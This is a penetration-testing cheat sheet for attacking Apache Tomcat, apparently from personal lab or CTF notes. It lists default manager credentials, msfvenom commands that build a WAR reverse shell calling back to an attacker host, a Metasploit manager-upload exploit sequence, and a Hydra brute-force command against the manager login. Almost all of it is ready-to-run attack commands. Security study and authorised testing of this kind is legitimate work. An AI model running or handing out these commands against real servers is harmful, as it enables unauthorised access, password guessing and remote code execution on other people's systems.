# Tomcat



## Exploitation Checks

* Open Tomcat Manager
  * Check to see if any of the default credentials will work to log in. Common ones:
    * `admin:admin`
    * `tomcat:tomcat`
    * `admin:<NOTHING>`
    * `admin:s3cr3t`
    * `tomcat:s3cr3t`
    * `admin:tomcat`
  * If so, we may be able to upload a war file to get a reverse shell.
  * After upload and deploying the war file, we can start a `netcat` listener, then select the war file from the Application Path column in Tomcat.
* Open Tomcat Administration
  * Check to see if any of the default credentials will work to log in.
* Check **/manager/status** path to look for version details and then known exploits especially if you cannot access **/manager/html**.

### MSFvenom Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shellw.war
```

### Metasploit

```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

## Brute Force

### Hydra

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

### Metasploit

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
